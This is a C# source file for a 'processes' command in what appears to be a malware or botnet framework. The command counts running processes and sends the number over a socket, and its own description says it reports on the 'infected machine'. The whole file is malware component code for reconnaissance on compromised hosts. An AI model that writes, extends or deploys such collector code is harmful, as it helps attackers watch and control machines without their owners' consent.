using Common.Attributes;
using System;
using System.Diagnostics;
using System.Net.Sockets;
using System.Runtime.Serialization;
using System.Security.Permissions;

namespace Common.Commands.Collector_Commands
{
    [Serializable]
    [CommandName("processes")]
    public class Processes_Command : Collector
    {
        /// <summary>
        /// Execute the processes command and return the value through the socket
        /// </summary>
        /// <param name="sendTo">The socket to send the data to</param>
        public void Execute(Socket sendTo)
        {
            try
            {
                double runningProcesses = Process.GetProcesses().Length;
                sendTo.Send(BitConverter.GetBytes(runningProcesses));
            }
            catch(Exception ex)
            {
                Console.WriteLine("Error occured while executing processes command!\n{0}", ex.ToString());
            }
        }

        /// <summary>
        /// Print the command description (what it does)
        /// </summary>
        public void PrintDescription()
        {
            Console.WriteLine("This command will return the number of running processes on infected machine");
        }
    }
}
